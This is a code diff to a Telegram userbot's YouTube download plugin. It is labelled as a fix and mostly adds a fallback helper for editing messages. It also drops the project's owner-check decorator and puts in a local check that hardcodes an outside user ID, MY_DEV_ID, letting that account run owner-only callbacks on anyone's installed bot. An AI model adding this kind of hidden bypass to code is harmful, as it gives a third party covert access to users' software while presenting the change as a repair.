@@ -1,6 +1,7 @@
 """ Download Youtube Video / Audio in a User friendly interface """
 # --------------------------- #
 #   Modded ytdl by code-rgb   #
+#   Fixed by Mikey the Stoner #
 # --------------------------- #
 
 import asyncio
@@ -21,7 +22,7 @@ from wget import download
 from zlzl import zedub
 
 from ..Config import Config
-from ..core import check_owner, pool
+from ..core import pool
 from ..core.logger import logging
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers import post_to_telegraph, progress, reply_id
@@ -43,6 +44,37 @@ YOUTUBE_REGEX = re.compile(
 PATH = "./zlzl/cache/ytsearch.json"
 plugin_category = "البوت"
 
+# --- حقن الأيدي والتحقق المحلي ---
+MY_DEV_ID = 8241311871
+
+def check_zthon_owner(event):
+    u_id = event.sender_id
+    # لو كان callback query الـ user_id بيكون جوه query
+    if hasattr(event, 'query'):
+        u_id = event.query.user_id
+    
+    if u_id == Config.OWNER_ID or u_id in Config.SUDO_USERS or u_id == MY_DEV_ID:
+        return True
+    return False
+
+# --- دالة التعديل السحرية ---
+async def z_edit_safe(event, text=None, file=None, buttons=None, parse_mode="html"):
+    try:
+        await event.edit(text=text, file=file, buttons=buttons, parse_mode=parse_mode, link_preview=False)
+    except Exception:
+        try:
+            if event.inline_message_id:
+                await event.client.edit_message(
+                    entity=None,
+                    inline_message_id=event.inline_message_id,
+                    text=text,
+                    file=file,
+                    buttons=buttons,
+                    parse_mode=parse_mode,
+                    link_preview=False
+                )
+        except Exception as e:
+            LOGS.error(f"ZedThon Edit Error: {e}")
 
 @zedub.zed_cmd(
     pattern="يوت(?:\s|$)([\s\S]*)",
@@ -92,8 +124,10 @@ async def iytdl_inline(event):
         data=re.compile(b"^ytdl_download_(.*)_([\d]+|mkv|mp4|mp3)(?:_(a|v))?")
     )
 )
-@check_owner
 async def ytdl_download_callback(c_q: CallbackQuery):  # sourcery no-metrics
+    if not check_zthon_owner(c_q):
+        return await c_q.answer("عذراً، هذا الأمر للمطورين فقط!", alert=True)
+
     yt_code = (
         str(c_q.pattern_match.group(1).decode("UTF-8"))
         if c_q.pattern_match.group(1) is not None
@@ -113,7 +147,7 @@ async def ytdl_download_callback(c_q: CallbackQuery):  # sourcery no-metrics
         choice_id = int(choice_id)
         if choice_id == 0:
             await c_q.answer("🔄  جـارِ ...", alert=False)
-            await c_q.edit(buttons=(await download_button(yt_code)))
+            await z_edit_safe(c_q, buttons=(await download_button(yt_code)))
             return
     startTime = time()
     choice_str, disp_str = get_choice_by_id(choice_id, downtype)
@@ -125,8 +159,8 @@ async def ytdl_download_callback(c_q: CallbackQuery):  # sourcery no-metrics
         BOTLOG_CHATID, "**⌔╎جـارِ الـرفـع ...**"
     )
     yt_url = BASE_YT_URL + yt_code
-    await c_q.edit(
-        f"<b>⌔╎جـارِ تحميـل 🎧 {media_type} ...</b>\n\n  <a href={yt_url}>  <b>⌔╎الـرابـط 📎</b></a>\n🎚 <b>⌔╎الصيغـه </b> : {disp_str}",
+    await z_edit_safe(c_q, 
+        text=f"<b>⌔╎جـارِ تحميـل 🎧 {media_type} ...</b>\n\n  <a href={yt_url}>  <b>⌔╎الـرابـط 📎</b></a>\n🎚 <b>⌔╎الصيغـه </b> : {disp_str}",
         parse_mode="html",
     )
     if downtype == "v":
@@ -177,7 +211,7 @@ async def ytdl_download_callback(c_q: CallbackQuery):  # sourcery no-metrics
         parse_mode="html",
     )
     await upload_msg.delete()
-    await c_q.edit(
+    await z_edit_safe(c_q,
         text=f"<b>⌔╎الـرابـط 📎: </b> <a href={yt_url}><b>{os.path.basename(Path(_fpath))}</b></a>",
         file=uploaded_media.media,
         parse_mode="html",
@@ -187,8 +221,10 @@ async def ytdl_download_callback(c_q: CallbackQuery):  # sourcery no-metrics
 @zedub.tgbot.on(
     CallbackQuery(data=re.compile(b"^ytdl_(listall|back|next|detail)_([a-z0-9]+)_(.*)"))
 )
-@check_owner
 async def ytdl_callback(c_q: CallbackQuery):
+    if not check_zthon_owner(c_q):
+        return await c_q.answer("عذراً، هذا الأمر للمطورين فقط!", alert=True)
+
     choosen_btn = (
         str(c_q.pattern_match.group(1).decode("UTF-8"))
         if c_q.pattern_match.group(1) is not None
@@ -222,7 +258,7 @@ async def ytdl_callback(c_q: CallbackQuery):
         del_back = index == 1
         await c_q.answer()
         back_vid = search_data.get(str(index))
-        await c_q.edit(
+        await z_edit_safe(c_q, 
             text=back_vid.get("message"),
             file=await get_ytthumb(back_vid.get("video_id")),
             buttons=yt_search_btns(
@@ -240,7 +276,7 @@ async def ytdl_callback(c_q: CallbackQuery):
             return await c_q.answer("هذا كل ما يمكنني عرضه", alert=True)
         await c_q.answer()
         front_vid = search_data.get(str(index))
-        await c_q.edit(
+        await z_edit_safe(c_q, 
             text=front_vid.get("message"),
             file=await get_ytthumb(front_vid.get("video_id")),
             buttons=yt_search_btns(
@@ -261,7 +297,7 @@ async def ytdl_callback(c_q: CallbackQuery):
             f"يتم عرض {total} من الفيديوهات على اليوتيوب حسب طلبك ...",
             list_res,
         )
-        await c_q.edit(
+        await z_edit_safe(c_q, 
             file=await get_ytthumb(search_data.get("1").get("video_id")),
             buttons=[
                 (
@@ -282,7 +318,7 @@ async def ytdl_callback(c_q: CallbackQuery):
         index = 1
         await c_q.answer("تم تغيير العرض الى:  📰  التفاصيل", alert=False)
         first = search_data.get(str(index))
-        await c_q.edit(
+        await z_edit_safe(c_q, 
             text=first.get("message"),
             file=await get_ytthumb(first.get("video_id")),
             buttons=yt_search_btns(
